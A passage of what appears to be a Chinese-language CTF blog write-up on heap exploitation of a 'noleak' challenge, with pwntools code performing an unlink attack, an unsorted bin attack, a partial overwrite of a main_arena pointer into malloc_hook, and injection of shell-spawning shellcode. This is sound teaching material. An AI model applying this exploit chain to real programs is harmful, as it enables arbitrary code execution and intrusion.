class="comment">#最后一位为0（伪造P位，使伪造chunk为free）</span></span><br><span class="line"><span class="comment">#fake chunk:0x90-0x10=0x80</span></span><br><span class="line"><span class="comment">#chunk1:0x90+0x10=0xa0</span></span><br><span class="line"><span class="comment">#new chunk:0x90+0x90=0x80+0xa0=0x120</span></span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line">free(<span class="string">&quot;1&quot;</span>)<span class="comment">#merge completed</span></span><br></pre></td></tr></table></figure>
+
+<p>chunk-&gt;fd：“buf - 0x18”，buf[-3]</p>
+<p>chunk-&gt;bk：“buf - 0x10”，buf[-2]</p>
+<p>unlink之后buf[0]的地址实际指向了buf[-3]的地址</p>
+<p>step2:调用edit编辑buf[0]，此时buf[0]指向bss段首部，buf[1]指向buf，并且我们在buf中又伪造了一个chunk，buf结构如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment">#填充buf[-3]~buf[-1]</span></span><br><span class="line">payload+=p64(bss_addr)+p64(buf_addr)<span class="comment">#buf[0]-&gt;bss  buf[1]-&gt;buf 改变buf数组指针指向bss，方便写入shellcode</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#new chunk:chunk2,chunk3</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)<span class="comment">#size(buf[4])  pre_size(buf[5])</span></span><br><span class="line"><span class="comment">#make a fake chunk in buf(the head is buf[4])</span></span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/07/08/heapnote/Untitled16.png" class title="Untitled">
+
+<p>step4:申请chunk23，要利用UAF、unsortbin attack将arena_main的地址写入chunk4,将malloc_hook地址写入buf。此时buf[2]指向的地址为buf[0]，也是正常malloc时候的地址+0x10，这是因为我们free buf[1]时进行了合并，chunk1和伪造的chunk0都合并进入了top chunk。</p>
+<p>前面伪造chunk0和chunk1合并后，在<strong>top chunk</strong>中存放有一个“0x90+0x90+0x10”大小的free chunk</p>
+<p>在申请第一段“0x100”的chunk时，<strong>top chunk</strong>中的chunk被切割为“0x90”</p>
+<p>在申请第二段“0x100”的chunk时，<strong>top chunk</strong>中的chunk大小不够，需要继续申请</p>
+<p> &#x2F;&#x2F;这里是为了把<strong>top chunk</strong>消耗干净，让chunk3成为新的<strong>top chunk</strong></p>
+<img src="/2023/07/08/heapnote/Untitled17.png" class title="Untitled">
+
+<blockquote>
+<p>这里将malloc_hook地址写入buf数组的原因：由于程序开启了ALSR保护，所以malloc_hook地址是会随机变化的，这说明我们不可能直接将malloc_hook地址直接写入buf，我们只能在不确定中寻找确定。在上面的引用中，我们发现当我们free掉一个大小属于unsorted bin的chunk时，它都会指向main_arena的固定偏移位置，因此，我们可以利用这一特点，将这一偏移地址存放在buf数组中，形成可读可写的状态，将处于同一内存页的malloc_hook的地址通过编辑功能修改得到。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[2]&quot;</span>)<span class="comment">#buf[2]-&gt;chunk2</span></span><br><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[3]&quot;</span>)<span class="comment">#buf[3]-&gt;chunk3 把topchunk消耗干净，让chunk3成为新的topchunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="string">&quot;2&quot;</span>)<span class="comment">#,chunk2(buf[2]指向的chunk)作为最后一个收入unsortbin</span></span><br><span class="line"><span class="comment">#no merge:chunk1&amp;chunk3 are all allocated chunks</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(buf_addr+<span class="number">0x8</span>*<span class="number">4</span>) <span class="comment">#fd-&gt;null(0)  bk-&gt;buf[4](fake chunk) chunk2已经是free状态</span></span><br><span class="line">change(<span class="string">&quot;2&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload) <span class="comment">#这样的话之前在buf中伪造的chunk4也进入了unsorted bin</span></span><br><span class="line"><span class="comment">#link fake chunk4 into unsorted bin</span></span><br></pre></td></tr></table></figure>
+
+<p>堆结构从</p>
+<img src="/2023/07/08/heapnote/Untitled18.png" class title="Untitled">
+
+<p>改变为</p>
+<img src="/2023/07/08/heapnote/Untitled19.png" class title="Untitled">
+
+<p>step5:</p>
+<p>再调用add申请一个和chunk2一样大小的chunk，这样unsorted bin中就只剩下伪造的chunk4，所以main arena+0x58的地址就被留在了buf[6]。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc(<span class="built_in">str</span>(<span class="number">0x100</span>),<span class="string">&quot;buf[2]&quot;</span>)<span class="comment">#buf[2]-&gt;chunk4</span></span><br><span class="line"><span class="comment">#chunk2 is used,fake chunk4 is the only one in unsorted bin</span></span><br><span class="line"><span class="comment">#buf[6]-&gt;main arena+0x58  buf[7]-&gt;main arena+0x58</span></span><br></pre></td></tr></table></figure>
+
+<p>因为“chunk2”属于“unsorted bin”，其<strong>bk</strong>指向“buf[4]”（“伪造的chunk4”的首地址）</p>
+<p>这样的话之前在buf中伪造的“伪造的chunk4”也进入了unsorted bin（被强行连接）</p>
+<p>添加一个和chunk2一样大小的chunk4，这样unsorted bin中只剩下伪造的chunk4了</p>
+<p>这里需要先分析一下ptmalloc的运算过程：</p>
+<p>申请chunk4时，程序在small bins中没有找到结果，于是在unsorted bin中进行<strong>遍历</strong></p>
+<p>因为“chunk2”排在“伪造的chunk4”前面，所以程序搜索到“chunk2”后<strong>终止</strong>，并不会<strong>重新分配</strong>“伪造的chunk4”</p>
+<p>step6:调用edit向buf[0]（bss首部）中写入shellcode</p>
+<p>调用edit向buf[6]中写入shellcode的地址</p>
+<p>&#x2F;&#x2F;改写main_arena的地址低位使其指向malloc_hook,将shellcode地址写入malloc_hook</p>
+<p>申请任意一个新chunk，触发mallochook执行shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(bss_addr)+p64(buf_addr)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=<span class="string">b&#x27;\x10&#x27;</span></span><br><span class="line">change(<span class="string">&quot;1&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(payload)),payload)</span><br><span class="line"><span class="comment">#main arena+0x58 become malloc_hook</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">change(<span class="string">&quot;0&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(shellcode)),shellcode)<span class="comment">#bss=&amp;shellcode buf[0]装有bss段的首地址，所以shellcode会被写入bss段，且首地址已知</span></span><br><span class="line">change(<span class="string">&quot;6&quot;</span>,<span class="string">&quot;8&quot;</span>,p64(bss_addr))<span class="comment">#malloc_hook-&gt;bss(&amp;shellcode) buf[6]中装有malloc_hook，所以malloc_hook会和shellcode挂钩</span></span><br></pre></td></tr></table></figure>
+
+<p>buf[1]中写入了buf[0]的地址，buf[0]中写入了bss段的地址</p>
+<p>buf[4]是伪造chunk4，在它就是<strong>unsorted bin</strong>中的<strong>最后一位</strong>，所以它的<strong>fd&amp;bk</strong>应该指向一个固定偏移<strong>main_arena+XX</strong>，这里不需要知道它具体是多少，只要知道它和<strong>malloc_hook</strong>只有最后两位不同就可以了</p>
+<p>在buf[1]中写入payload，而payload会实际写入buf[0]，前面的数据会依次填充“buf[0]~buf[5]”，而最后一位数据“\x10”会<strong>填入fd</strong>，因为计算机采用<strong>小端序</strong>，所以“\x10”会覆盖<strong>fd</strong>指针指向内容的最后两个字节，它正是<strong>main_arena+XX</strong>，它会被覆盖为<strong>malloc_hook</strong>（在malloc_trim()里找到）</p>
+<img src="/2023/07/08/heapnote/Untitled20.png" class title="Untitled">
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">堆笔记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9A-note-service2-UAF"><span class="toc-number">2.</span> <span class="toc-text">例题：**note_service2(**UAF)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%EF%BC%9Anoleak%EF%BC%88mallochook-UAF%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">例题：noleak（mallochook+UAF）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%EF%BC%9Abin"><span class="toc-number">3.1.</span> <span class="toc-text">堆管理机制：bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%EF%BC%9Achunk"><span class="toc-number">3.2.</span> <span class="toc-text">堆管理机制：chunk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%EF%BC%9Aptmalloc%E7%AE%97%E6%B3%95"><span class="toc-number">3.3.</span> <span class="toc-text">堆管理机制：ptmalloc算法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unlink%E6%9C%BA%E5%88%B6%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">Unlink机制：</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yushusu.github.io/2023/07/08/heapnote/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yushusu.github.io/2023/07/08/heapnote/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yushusu.github.io/2023/07/08/heapnote/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yushusu.github.io/2023/07/08/heapnote/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yushusu.github.io/2023/07/08/heapnote/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yushusu.github.io/2023/07/08/heapnote/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yushusu.github.io/2023/07/08/heapnote/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    yushusu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
